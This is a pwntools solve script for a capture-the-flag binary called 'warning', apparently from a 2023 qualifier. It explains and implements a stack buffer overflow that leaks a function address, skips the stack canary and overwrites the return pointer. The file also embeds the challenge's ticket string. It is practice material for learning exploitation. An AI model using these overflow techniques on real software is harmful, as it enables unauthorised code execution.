""" Solution
    
    Really cool challenge, this one had you write to the buffer, to load it with values that were then used to initialize the object.
    The object uses the values in memory at the time, then uses basic math to test that the cases pass.
    Backtracking the math and where values need to be, we can see where are values should be located to pass both test cases.
    After this we are given access to write some data to the stack.
    Looking at how pointer math was happening, we are able to fill the uncompressed buffer, jump over the stack canary and overwrite rip

    """

""" Post Mortem

    Was having strange issues with newline characters, should've been able to debug this faster

    """

from pwn import *
from time import sleep

context.binary = './warning'
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

HOST = "warning.quals2023-kah5Aiv9.satellitesabove.me"
PORT = 5300
TICKET = "ticket{victor735807lima4:GEroPpD3aNVp54vCN69i2R_biIHmxkOENRYJCaqwagt_rwA9klkYvSuWDFIEGB90eQ}"

def get_process():
  proc = process()
  #proc = remote(HOST, PORT)
  #proc.sendlineafter(b'Ticket please:', TICKET.encode())

  return proc

def attach_gdb(proc):
  gdb.attach(proc, gdbscript="""
  break Warning::jump_around(char*, char*, char*, unsigned long)
  c
  """)
  sleep(3)

def main():
  proc = get_process()
  attach_gdb(proc)

  # Setup the heap to pass case1 and case2
  x0 = b'\x01\x01\x01\x01'
  x4 = b'\x05\xFF\xFF\xFF'
  x8 = b'\xF6\x10\x00\x00'
  xc = b'\x01\x01\x01\x01'

  payload_case_1 = b''.join([x0,x4,x8,xc])*100
  payload_case_2 = b'\xaa'

  proc.sendlineafter(b'> ', payload_case_1)
  proc.sendlineafter(b'> ', payload_case_2)

  # Get our function address
  leak = proc.readline_contains(b'get_flag').decode().strip()[12:]
  leak = bytes.fromhex(leak)
  leak = int.from_bytes(leak, 'big')
  leak = p64(leak)
  print(leak)
  
  proc.sendline() # for some reason this is needed to balance the amount of newline chars

  # Need to add the value we are trying to jump to in this buffer.
  # This is because 10 bytes are copied over to our uncompressed buffer, which is used to overwrite rip
  payload = b'Z'*10 + b'Y'*10 + b'X'*10 + leak + b'W'*2
  proc.sendline(payload)

  # Write enough bytes such that the uncompressed buffer is 266 bytes long and the check reads only 1 byte
  # Then jump past the stack canary to overwrite the return address
  payload = b''.join([
    b'A'*63,
    b'B'*63,
    b'C'*63,
    b'D'*33,
    b'E'*22
  ])
  proc.sendline(payload)

  proc.interactive()

if __name__ == '__main__':
  main()
